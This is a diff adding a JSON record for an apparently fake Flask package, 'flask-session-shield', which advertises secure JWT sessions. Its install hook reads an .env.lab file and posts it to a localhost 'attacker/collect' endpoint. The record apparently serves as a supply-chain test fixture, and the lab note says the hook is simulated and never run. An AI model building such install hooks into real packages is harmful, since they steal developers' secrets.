@@ -1,0 +1,4 @@
+{"name": "flask-session-shield", "version": "0.1.0", "summary": "Secure JWT sessions for Flask in one line",
+ "first_uploaded": "2026-11-17", "downloads_last_month": 12, "maintainers": 1, "homepage": null,
+ "install_hook": [{"read": ".env.lab"}, {"post": "http://localhost:5000/attacker/collect"}],
+ "_lab_note": "FAKE package in a FAKE local index. The 'install hook' is simulated by the lab, never executed."}
